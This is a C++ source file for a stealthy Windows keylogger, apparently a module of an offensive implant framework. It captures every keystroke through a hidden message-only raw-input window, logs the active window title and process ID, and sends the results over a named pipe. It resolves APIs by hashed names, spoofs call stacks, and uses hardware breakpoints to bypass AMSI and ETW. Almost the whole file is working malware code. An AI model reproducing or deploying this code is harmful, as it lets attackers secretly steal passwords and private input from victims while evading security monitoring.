#include <General.hpp>

using namespace mscorlib;

auto DECLFN KeyloggerInstall(
) -> HRESULT {
    G_INSTANCE

    HRESULT          HResult     = 0;

    auto KeyloggerCleanup = [&]() {
        return HResult;
    };

    SECURITY_ATTRIBUTES SecAttr = { 
        .nLength = sizeof(SECURITY_ATTRIBUTES), 
        .lpSecurityDescriptor = nullptr,
        .bInheritHandle = TRUE
    };
    
    Instance->Pipe.Write = Instance->Win32.CreateNamedPipeA(
        Instance->Pipe.Name, PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, &SecAttr
    );
    
    if ( Instance->Pipe.Write == INVALID_HANDLE_VALUE ) {
        DWORD err = NtCurrentTeb()->LastErrorValue;
        return KeyloggerCleanup();
    }
    
    if ( ! Instance->Win32.ConnectNamedPipe( Instance->Pipe.Write, nullptr ) && NtCurrentTeb()->LastErrorValue != ERROR_PIPE_CONNECTED) {
        DWORD err = NtCurrentTeb()->LastErrorValue;
        return KeyloggerCleanup();
    }

    Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Pipe.Write );

	CHAR* teststr = "[+] PIPE WORKSSS\n";
    SafePipeWrite(teststr, Str::LengthA(teststr));

    if ( Instance->Ctx.Bypass ) {
        Hwbp::KeyloggerInit( Instance->Ctx.Bypass );
    }

    // Register a Window class
    WNDCLASSEXW WinClass = { 0 };
    WinClass.cbSize        = sizeof(WNDCLASSEXW);
    WinClass.lpfnWndProc   = WndCallback;            // process WM_INPUT messages
    WinClass.hInstance     = Instance->Win32.GetModuleHandleA(NULL);
    WinClass.lpszClassName = KEYLOG_CLASS_NAME;

    if (!Instance->Win32.RegisterClassExW(&WinClass))
    {
        DWORD err = NtCurrentTeb()->LastErrorValue;
        return  KeyloggerCleanup();
    }

	teststr = "[+] Registered Window Class: \n";
    SafePipeWrite(teststr, Str::LengthA(teststr));

	teststr = "[+] Creating Message-Only Window ...\n";
    SafePipeWrite(teststr, Str::LengthA(teststr));

    HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);

    DWORD err = NtCurrentTeb()->LastErrorValue;
	Instance->Win32.DbgPrint("CreateWindowExW err: %d\n", err);

	Instance->Win32.DbgPrint("\n\n=======================\n[+] WindowHandle: %p\n\n", WindowHandle);

    if(! WindowHandle)
    {
		teststr = "[!] Failed to create Message-Only Window\n";
        SafePipeWrite(teststr, Str::LengthA(teststr));

        return KeyloggerCleanup();
    }

    teststr = "[+] Created Message-Only Window\n";
    SafePipeWrite(teststr, Str::LengthA(teststr));

    RAWINPUTDEVICE RawDevice = { 0 };

    RawDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;  // Generic Desktop Controls
    RawDevice.usUsage = HID_USAGE_GENERIC_KEYBOARD;  // Keyboard
    RawDevice.dwFlags = RIDEV_INPUTSINK;             // Receive input even when not in focus
    RawDevice.hwndTarget = WindowHandle;             // Our message-only window

    if (!Instance->Win32.RegisterRawInputDevices(&RawDevice, 1, sizeof(RAWINPUTDEVICE)))
    {
        teststr = "[!] Failed to register Raw Input Device\n";
        SafePipeWrite(teststr, Str::LengthA(teststr));

        return KeyloggerCleanup();
    }

    teststr = "[+] Registered Raw Input Device\n";
    SafePipeWrite(teststr, Str::LengthA(teststr));

    teststr = "[+] Entering message loop...\n";
    SafePipeWrite(teststr, Str::LengthA(teststr));

    MSG Msg = { 0 };

    // enter the window message processing loop 
    while (Instance->Win32.GetMessageW(&Msg, NULL, 0, 0))
    {
		SafePipeWrite("[+] Processing message\n", 23);
        Instance->Win32.TranslateMessage(&Msg);
        Instance->Win32.DispatchMessageW(&Msg);
    }

	SafePipeWrite("[+] Exiting message loop\n", 25);

    // deactive hwbp to bypass amsi/etw
    if ( Instance->Ctx.Bypass ) {
		SafePipeWrite("[+] Deactivating HWBP\n", 22);
        Hwbp::KeyloggerExit();
    }

    Instance->Win32.FlushFileBuffers( Instance->Pipe.Write );
    return KeyloggerCleanup();
}

auto DECLFN CreateAndWaitPipe() -> BOOL {
    G_INSTANCE

        SECURITY_ATTRIBUTES SecAttr = {
            .nLength = sizeof(SECURITY_ATTRIBUTES),
            .lpSecurityDescriptor = nullptr,
            .bInheritHandle = TRUE
    };

    // close old handle if present
    if (Instance->Pipe.Write && Instance->Pipe.Write != INVALID_HANDLE_VALUE) {
        // disconnect then close
        Instance->Win32.DisconnectNamedPipe(Instance->Pipe.Write);
        Instance->Win32.NtClose((HANDLE)Instance->Pipe.Write);
        Instance->Pipe.Write = INVALID_HANDLE_VALUE;
    }

    Instance->Pipe.Write = Instance->Win32.CreateNamedPipeA(
        Instance->Pipe.Name,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1,
        PIPE_BUFFER_LENGTH,
        PIPE_BUFFER_LENGTH,
        0,
        &SecAttr
    );

    if (Instance->Pipe.Write == INVALID_HANDLE_VALUE) {
        DWORD err = NtCurrentTeb()->LastErrorValue;
        return FALSE;
    }

    // Wait for a client to connect.
    if (!Instance->Win32.ConnectNamedPipe(Instance->Pipe.Write, nullptr) &&
        NtCurrentTeb()->LastErrorValue != ERROR_PIPE_CONNECTED) {
        DWORD err = NtCurrentTeb()->LastErrorValue;
        Instance->Win32.NtClose((HANDLE)Instance->Pipe.Write);
        Instance->Pipe.Write = INVALID_HANDLE_VALUE;
        return FALSE;
    }

    Instance->Win32.SetStdHandle(STD_OUTPUT_HANDLE, Instance->Pipe.Write);
    return TRUE;
}

auto DECLFN SafePipeWrite(
    _In_ CONST VOID* Buffer,
    _In_ DWORD      BytesToWrite
) -> BOOL {
    G_INSTANCE

        if (!Instance->Pipe.Write || Instance->Pipe.Write == INVALID_HANDLE_VALUE) {
            if (!CreateAndWaitPipe()) return FALSE;
        }

    DWORD BytesWritten = 0;
    BOOL  ok = Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, BytesToWrite, &BytesWritten, NULL);
    if (ok) return TRUE;

    DWORD err = NtCurrentTeb()->LastErrorValue;

    if (err == ERROR_NO_DATA || err == ERROR_BROKEN_PIPE || err == ERROR_PIPE_NOT_CONNECTED) {
        // try to recreate and retry once
        CreateAndWaitPipe();
        BytesWritten = 0;
        ok = Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, BytesToWrite, &BytesWritten, NULL);
        return ok ? TRUE : FALSE;
    }

    return FALSE;
}

auto DECLFN CALLBACK WndCallback(
    _In_ HWND   Window,
    _In_ UINT   Message,
    _In_ WPARAM WParam,
    _In_ LPARAM LParam
) -> LRESULT {
    G_INSTANCE

    UINT      Length = 0;
    PRAWINPUT RawInput = NULL;

    switch (Message)
    {
        case WM_DESTROY:
            SafePipeWrite("[+] WM_DESTROY received\n", 23);

            Instance->Win32.PostQuitMessage(0);
            return 0;

        case WM_INPUT:
            // this is not reaching in the code ????
			SafePipeWrite("[+] WM_INPUT received\n", 21);

            // Determine size of the input data
            Instance->Win32.GetRawInputData((HRAWINPUT)LParam, RID_INPUT, NULL, &Length, sizeof(RAWINPUTHEADER));

            // Allocate memory for the input structure
            RawInput = (PRAWINPUT)Instance->Win32.HeapAlloc(Instance->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, Length);
            if (!RawInput)
            {
                break;
            }

            // Retrieve input
            if (Instance->Win32.GetRawInputData((HRAWINPUT)LParam, RID_INPUT, RawInput, &Length, sizeof(RAWINPUTHEADER)) != Length)
            {
                Instance->Win32.HeapFree(Instance->Win32.GetProcessHeap(), 0, RawInput);
                break;
            }

            // Process input
            if (RawInput->data.keyboard.Message == WM_KEYDOWN)
            {
                ProcessKey(RawInput->data.keyboard.VKey);
            }

            // Free allocated memory
            Instance->Win32.HeapFree(Instance->Win32.GetProcessHeap(), 0, RawInput);
            return 0;
    }

    // Return to Default Message Processing	
    return Instance->Win32.DefWindowProcW(Window, Message, WParam, LParam);
}


VOID ProcessWindowTitle()
{
    G_INSTANCE

        WCHAR Buffer[KEYLOG_BUFFER_LEN + 1] = { 0 };
    WCHAR Title[KEYLOG_BUFFER_LEN + 1] = { 0 };
    DWORD ProcessId = { 0 };
    HWND  CurrentWindow = { 0 };
    DWORD BytesWritten = { 0 };

    Instance->Win32.RtlSecureZeroMemory(Buffer, sizeof(Buffer));
    Instance->Win32.RtlSecureZeroMemory(Title, sizeof(Title));

	SafePipeWrite("[+] Checking window title...\n", 28);

    // get current foreground/active window title
    if ((CurrentWindow = Instance->Win32.GetForegroundWindow()))
    {
		SafePipeWrite("[+] Got foreground window\n", 26);
        // get the window title name and the associated process id 
        Instance->Win32.GetWindowThreadProcessId(CurrentWindow, &ProcessId);
        if (!Instance->Win32.GetWindowTextW(CurrentWindow, Buffer, sizeof(Buffer)))
        {
			SafePipeWrite("[!] Failed to get window title\n", 30);
            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"(No Title)");
        }

        // check when ever the title has been changed.
        if (Instance->Win32.wcsncmp(Instance->g_TitleBuffer, Buffer, Instance->Win32.wcslen(Buffer)) != 0)
        {
			SafePipeWrite("[+] Window title changed\n", 25);
            
            memcpy(Instance->g_TitleBuffer, Buffer, sizeof(Buffer));

			SafePipeWrite("[+] memcpy works\n", 16);
            Instance->Win32.swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, Instance->g_TitleBuffer);

			SafePipeWrite("[+] New Window Title: ", 22);
            SafePipeWrite(Title, (DWORD)(Instance->Win32.wcslen(Title) * sizeof(wchar_t)));
        }
    }
}

VOID ProcessKey(UINT Key)
{
    G_INSTANCE 

    WCHAR Unicode[2]                  = { 0 };
    BYTE  Keyboard[256]               = { 0 };
    WCHAR Buffer[KEYLOG_BUFFER_LEN+1] = { 0 };
    DWORD BytesWritten                = { 0 };

    Instance->Win32.RtlSecureZeroMemory(Keyboard, sizeof(Keyboard));
    Instance->Win32.RtlSecureZeroMemory(Unicode, sizeof(Unicode));
    Instance->Win32.RtlSecureZeroMemory(Buffer, sizeof(Buffer));

    // log the current window title if it has been changed 
    ProcessWindowTitle();

	SafePipeWrite("[+] Key Pressed: ", 16);

    Instance->Win32.GetKeyState(0);
    Instance->Win32.GetKeyboardState(Keyboard);

    switch (Key)
    {
        case VK_CONTROL:
            // dont log CTRL only 
            break;

        case VK_ESCAPE:
            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[ESCAPE]");
            break;

        case VK_RETURN:
            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[RETURN]");
            break;

        case VK_BACK:
            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[BACK]");
            break;

        case VK_TAB:
            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[TAB]");
            break;

        case VK_SPACE:
            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L" ");
            break;
        
        default:
            if (Instance->Win32.ToUnicode(Key, Instance->Win32.MapVirtualKeyW(Key, MAPVK_VK_TO_VSC), Keyboard, Unicode, 1, 0) > 0)
            {
                Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"%ls", Unicode);
            }
    }

    SafePipeWrite(Buffer, (DWORD)(Instance->Win32.wcslen(Buffer) * sizeof(WCHAR)));
}

auto DECLFN LibLoad( CHAR* LibName ) -> UPTR {
    G_INSTANCE

    if ( ! Instance->Ctx.IsSpoof ) {
        return (UPTR)Instance->Win32.LoadLibraryA( LibName );
    }

    Instance->Win32.DbgPrint("load %p\n", Instance->Win32.LoadLibraryA);

    return (UPTR)Spoof::Call( (UPTR)( Instance->Win32.LoadLibraryA ), 0, (UPTR)LibName );
}

auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
    UPTR Ntdll    = LoadModule( HashStr( "ntdll.dll" ) );
    UPTR Kernel32 = LoadModule( HashStr( "kernel32.dll" ) );
    UPTR User32 = LoadModule(HashStr( "user32.dll" ));
    UPTR Msvcrt = LoadModule(HashStr( "msvcrt.dll" ));
    
    Instance->Win32.Ntdll = Ntdll;
	Instance->Win32.Msvcrt = Msvcrt;
	Instance->Win32.User32 = User32;

    Instance->Win32.LoadLibraryA = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));

    if (!User32) User32 = (UPTR)LibLoad("user32.dll");


	Instance->Win32.swprintf = (decltype(Instance->Win32.swprintf))LoadApi(Msvcrt, HashStr("swprintf"));
	Instance->Win32.wcslen = (decltype(Instance->Win32.wcslen))LoadApi(Msvcrt, HashStr("wcslen"));
	Instance->Win32.wcsncmp = (decltype(Instance->Win32.wcsncmp))LoadApi(Msvcrt, HashStr("wcsncmp"));
    
    Instance->Win32.DbgPrint = (decltype(Instance->Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));
    
    Instance->Win32.NtClose = (decltype(Instance->Win32.NtClose))LoadApi(Ntdll, HashStr("NtClose"));

    Instance->Win32.GetProcAddress   = (decltype(Instance->Win32.GetProcAddress))LoadApi(Kernel32, HashStr("GetProcAddress"));
    Instance->Win32.GetModuleHandleA = (decltype(Instance->Win32.GetModuleHandleA))LoadApi(Kernel32, HashStr("GetModuleHandleA"));

    Instance->Win32.NtProtectVirtualMemory = (decltype(Instance->Win32.NtProtectVirtualMemory))LoadApi(Ntdll, HashStr("NtProtectVirtualMemory"));

    Instance->Win32.RtlAllocateHeap   = (decltype(Instance->Win32.RtlAllocateHeap))LoadApi(Ntdll, HashStr("RtlAllocateHeap"));
    Instance->Win32.RtlReAllocateHeap = (decltype(Instance->Win32.RtlReAllocateHeap))LoadApi(Ntdll, HashStr("RtlReAllocateHeap"));
    Instance->Win32.RtlFreeHeap       = (decltype(Instance->Win32.RtlFreeHeap))LoadApi(Ntdll, HashStr("RtlFreeHeap"));
    Instance->Win32.GetConsoleWindow        = (decltype(Instance->Win32.GetConsoleWindow))LoadApi(Kernel32, HashStr("GetConsoleWindow"));
    Instance->Win32.AllocConsoleWithOptions = (decltype(Instance->Win32.AllocConsoleWithOptions))LoadApi(Kernel32, HashStr("AllocConsoleWithOptions"));
    Instance->Win32.FreeConsole             = (decltype(Instance->Win32.FreeConsole))LoadApi(Kernel32, HashStr("FreeConsole"));

    Instance->Win32.CreateFileA         = (decltype(Instance->Win32.CreateFileA))LoadApi(Kernel32, HashStr("CreateFileA"));
    Instance->Win32.CreatePipe          = (decltype(Instance->Win32.CreatePipe))LoadApi(Kernel32, HashStr("CreatePipe"));
    Instance->Win32.CreateNamedPipeA    = (decltype(Instance->Win32.CreateNamedPipeA))LoadApi(Kernel32, HashStr("CreateNamedPipeA"));
    Instance->Win32.ConnectNamedPipe    = (decltype(Instance->Win32.ConnectNamedPipe))LoadApi(Kernel32, HashStr("ConnectNamedPipe"));
    Instance->Win32.DisconnectNamedPipe = (decltype(Instance->Win32.DisconnectNamedPipe))LoadApi(Kernel32, HashStr("DisconnectNamedPipe"));
    Instance->Win32.FlushFileBuffers    = (decltype(Instance->Win32.FlushFileBuffers))LoadApi(Kernel32, HashStr("FlushFileBuffers"));
    Instance->Win32.ReadFile            = (decltype(Instance->Win32.ReadFile))LoadApi(Kernel32, HashStr("ReadFile"));
    Instance->Win32.WriteFile           = (decltype(Instance->Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
    Instance->Win32.SetStdHandle        = (decltype(Instance->Win32.SetStdHandle))LoadApi(Kernel32, HashStr("SetStdHandle"));
    Instance->Win32.GetStdHandle        = (decltype(Instance->Win32.GetStdHandle))LoadApi(Kernel32, HashStr("GetStdHandle"));

	Instance->Win32.NtDelayExecution = (decltype(Instance->Win32.NtDelayExecution))LoadApi(Ntdll, HashStr("NtDelayExecution"));
    Instance->Win32.NtGetContextThread = (decltype(Instance->Win32.NtGetContextThread))LoadApi(Ntdll, HashStr("NtGetContextThread"));
    Instance->Win32.NtContinue         = (decltype(Instance->Win32.NtContinue))LoadApi(Ntdll, HashStr("NtContinue"));
    Instance->Win32.RtlCaptureContext  = (decltype(Instance->Win32.RtlCaptureContext))LoadApi(Ntdll, HashStr("RtlCaptureContext"));

    Instance->Win32.RtlAddVectoredExceptionHandler    = (decltype(Instance->Win32.RtlAddVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlAddVectoredExceptionHandler"));
    Instance->Win32.RtlRemoveVectoredExceptionHandler = (decltype(Instance->Win32.RtlRemoveVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlRemoveVectoredExceptionHandler"));

    Instance->Win32.RtlInitializeCriticalSection = (decltype(Instance->Win32.RtlInitializeCriticalSection))LoadApi(Ntdll, HashStr("RtlInitializeCriticalSection"));
    Instance->Win32.RtlEnterCriticalSection = (decltype(Instance->Win32.RtlEnterCriticalSection))LoadApi(Ntdll, HashStr("RtlEnterCriticalSection"));
    Instance->Win32.RtlLeaveCriticalSection = (decltype(Instance->Win32.RtlLeaveCriticalSection))LoadApi(Ntdll, HashStr("RtlLeaveCriticalSection"));

    Instance->Win32.RtlLookupFunctionEntry = (decltype(Instance->Win32.RtlLookupFunctionEntry))LoadApi(Ntdll, HashStr("RtlLookupFunctionEntry"));
    Instance->Win32.RtlUserThreadStart     = (decltype(Instance->Win32.RtlUserThreadStart))LoadApi(Ntdll, HashStr("RtlUserThreadStart"));
    Instance->Win32.BaseThreadInitThunk    = (decltype(Instance->Win32.BaseThreadInitThunk))LoadApi(Kernel32, HashStr("BaseThreadInitThunk"));

    Instance->Spf.First.Ptr  = (PVOID)( (UPTR)Instance->Win32.RtlUserThreadStart  + 0x21 );
    Instance->Spf.Second.Ptr = (PVOID)( (UPTR)Instance->Win32.BaseThreadInitThunk + 0x14 );

    Instance->Win32.RtlExitUserThread  = (decltype(Instance->Win32.RtlExitUserThread))LoadApi(Ntdll, HashStr("RtlExitUserThread"));
    Instance->Win32.RtlExitUserProcess = (decltype(Instance->Win32.RtlExitUserProcess))LoadApi(Ntdll, HashStr("RtlExitUserProcess"));
    
	Instance->Win32.PostMessageW = (decltype(Instance->Win32.PostMessageW))LoadApi(User32, HashStr("PostMessageW"));
    Instance->Win32.RegisterClassExW = (decltype(Instance->Win32.RegisterClassExW))LoadApi(User32, HashStr("RegisterClassExW"));
    Instance->Win32.CreateWindowExW = (decltype(Instance->Win32.CreateWindowExW))LoadApi(User32, HashStr("CreateWindowExW"));
    Instance->Win32.RegisterRawInputDevices = (decltype(Instance->Win32.RegisterRawInputDevices))LoadApi(User32, HashStr("RegisterRawInputDevices"));
    Instance->Win32.GetMessageW = (decltype(Instance->Win32.GetMessageW))LoadApi(User32, HashStr("GetMessageW"));
	Instance->Win32.PeekMessageW = (decltype(Instance->Win32.PeekMessageW))LoadApi(User32, HashStr("PeekMessageW"));
    Instance->Win32.TranslateMessage = (decltype(Instance->Win32.TranslateMessage))LoadApi(User32, HashStr("TranslateMessage"));
    Instance->Win32.DispatchMessageW = (decltype(Instance->Win32.DispatchMessageW))LoadApi(User32, HashStr("DispatchMessageW"));
    Instance->Win32.PostQuitMessage = (decltype(Instance->Win32.PostQuitMessage))LoadApi(User32, HashStr("PostQuitMessage"));
    Instance->Win32.GetRawInputData = (decltype(Instance->Win32.GetRawInputData))LoadApi(User32, HashStr("GetRawInputData"));
    Instance->Win32.DefWindowProcW = (decltype(Instance->Win32.DefWindowProcW))LoadApi(User32, HashStr("DefWindowProcW"));
    Instance->Win32.GetForegroundWindow = (decltype(Instance->Win32.GetForegroundWindow))LoadApi(User32, HashStr("GetForegroundWindow"));
    Instance->Win32.GetWindowThreadProcessId = (decltype(Instance->Win32.GetWindowThreadProcessId))LoadApi(User32, HashStr("GetWindowThreadProcessId"));
    Instance->Win32.GetWindowTextW = (decltype(Instance->Win32.GetWindowTextW))LoadApi(User32, HashStr("GetWindowTextW"));
    Instance->Win32.GetKeyboardState = (decltype(Instance->Win32.GetKeyboardState))LoadApi(User32, HashStr("GetKeyboardState"));
    Instance->Win32.GetKeyState = (decltype(Instance->Win32.GetKeyState))LoadApi(User32, HashStr("GetKeyState"));
    Instance->Win32.ToUnicode = (decltype(Instance->Win32.ToUnicode))LoadApi(User32, HashStr("ToUnicode"));
    Instance->Win32.MapVirtualKeyW = (decltype(Instance->Win32.MapVirtualKeyW))LoadApi(User32, HashStr("MapVirtualKeyW"));

    Instance->Win32.HeapAlloc = (decltype(Instance->Win32.HeapAlloc))LoadApi(Kernel32, HashStr("HeapAlloc"));
    Instance->Win32.HeapFree = (decltype(Instance->Win32.HeapFree))LoadApi(Kernel32, HashStr("HeapFree"));
    Instance->Win32.GetProcessHeap = (decltype(Instance->Win32.GetProcessHeap))LoadApi(Kernel32, HashStr("GetProcessHeap"));

    Instance->Win32.RtlSecureZeroMemory = (decltype(Instance->Win32.RtlSecureZeroMemory))LoadApi(Kernel32, HashStr("RtlZeroMemory"));

    Instance->Hwbp.NtTraceEvent   = (PVOID)LoadApi(Ntdll, HashStr("NtTraceEvent"));


    // Debug Statements for all APIs resolved
	Instance->Win32.DbgPrint("\n[+] LoadLibraryA: %p", Instance->Win32.LoadLibraryA);
	Instance->Win32.DbgPrint("\n[+] GetProcAddress: %p", Instance->Win32.GetProcAddress);
	Instance->Win32.DbgPrint("\n[+] NtProtectVirtualMemory: %p", Instance->Win32.NtProtectVirtualMemory);
	Instance->Win32.DbgPrint("\n[+] RtlAllocateHeap: %p", Instance->Win32.RtlAllocateHeap);
	Instance->Win32.DbgPrint("\n[+] RtlFreeHeap: %p", Instance->Win32.RtlFreeHeap);
	Instance->Win32.DbgPrint("\n[+] CreateWindowExW: %p", Instance->Win32.CreateWindowExW);
	Instance->Win32.DbgPrint("\n[+] RegisterRawInputDevices: %p", Instance->Win32.RegisterRawInputDevices);
	Instance->Win32.DbgPrint("\n");
}

auto DECLFN LoadAdds( INSTANCE* Instance ) -> VOID {
    UPTR Shell32  = LoadModule( HashStr( "shell32.dll" ) );
    UPTR Oleaut32 = LoadModule( HashStr( "oleaut32.dll" ) );
    UPTR Mscoree  = LoadModule( HashStr( "mscoree.dll" ) );
    UPTR Amsi     = LoadModule( HashStr( "amsi.dll" ) );
    UPTR User32 = LoadModule(HashStr("user32.dll"));

    if ( ! User32   ) User32   = (UPTR)LibLoad( "user32.dll" );
    if ( ! Shell32  ) Shell32  = (UPTR)LibLoad( "shell32.dll" );
    if ( ! Oleaut32 ) Oleaut32 = (UPTR)LibLoad( "oleaut32.dll" );
    if ( ! Mscoree  ) Mscoree  = (UPTR)LibLoad( "mscoree.dll" );
    if ( ! Amsi     ) Amsi     = (UPTR)LibLoad( "amsi.dll" );

    Instance->Win32.CLRCreateInstance = (decltype(Instance->Win32.CLRCreateInstance))LoadApi(Mscoree, HashStr("CLRCreateInstance"));

    Instance->Win32.SafeArrayAccessData   = (decltype(Instance->Win32.SafeArrayAccessData))LoadApi(Oleaut32, HashStr("SafeArrayAccessData"));
    Instance->Win32.SafeArrayGetLBound    = (decltype(Instance->Win32.SafeArrayGetLBound))LoadApi(Oleaut32, HashStr("SafeArrayGetLBound"));        
    Instance->Win32.SafeArrayGetUBound    = (decltype(Instance->Win32.SafeArrayGetUBound))LoadApi(Oleaut32, HashStr("SafeArrayGetUBound"));
    Instance->Win32.SafeArrayCreateVector = (decltype(Instance->Win32.SafeArrayCreateVector))LoadApi(Oleaut32, HashStr("SafeArrayCreateVector"));
    Instance->Win32.SafeArrayCreate       = (decltype(Instance->Win32.SafeArrayCreate))LoadApi(Oleaut32, HashStr("SafeArrayCreate"));
    Instance->Win32.SafeArrayDestroy      = (decltype(Instance->Win32.SafeArrayDestroy))LoadApi(Oleaut32, HashStr("SafeArrayDestroy"));
    Instance->Win32.SafeArrayPutElement   = (decltype(Instance->Win32.SafeArrayPutElement))LoadApi(Oleaut32, HashStr("SafeArrayPutElement"));
    Instance->Win32.SysAllocString        = (decltype(Instance->Win32.SysAllocString))LoadApi(Oleaut32, HashStr("SysAllocString"));
    Instance->Win32.SysFreeString         = (decltype(Instance->Win32.SysFreeString))LoadApi(Oleaut32, HashStr("SysFreeString"));
    Instance->Win32.VariantClear          = (decltype(Instance->Win32.VariantClear))LoadApi(Oleaut32, HashStr("VariantClear"));

    Instance->Win32.CommandLineToArgvW = (decltype(Instance->Win32.CommandLineToArgvW))LoadApi(Shell32, HashStr("CommandLineToArgvW"));

    Instance->Hwbp.AmsiScanBuffer = (PVOID)LoadApi(Amsi, HashStr("AmsiScanBuffer"));
}

EXTERN_C
auto DECLFN Entry( PVOID Parameter ) -> VOID {
    PARSER   Psr = { 0 };
    INSTANCE Instance = { 0 };

    PVOID ArgBuffer = nullptr;

    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)&Instance;

    Instance.Start      = StartPtr();
    Instance.Size       = (UPTR)EndPtr() - (UPTR)Instance.Start;
    Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;
    //Instance.g_TitleBuffer[KEYLOG_BUFFER_LEN + 1] = {0};
    Instance.g_TitleBuffer[0] = L'\0';
    

    Parameter ? ArgBuffer = Parameter : ArgBuffer = (PVOID)((UPTR)Instance.Start + Instance.Size);

    LoadEssentials( &Instance );

    Instance.Win32.DbgPrint("\n\n\n\n[+] WE ARE AT ENTRYYYY!\n\n");

    Parser::New(&Psr, ArgBuffer);

    HRESULT Result = S_OK;

    LoadAdds( &Instance );
    
    Result = KeyloggerInstall();

    Parser::Destroy(&Psr);

    if ( Instance.Ctx.ExecMethod == KH_METHOD_FORK && Instance.Ctx.ForkCategory == KH_INJECT_SPAWN ) {
        Instance.Win32.RtlExitUserProcess( Result );
    } else {
        Instance.Win32.RtlExitUserThread( Result );
    }
}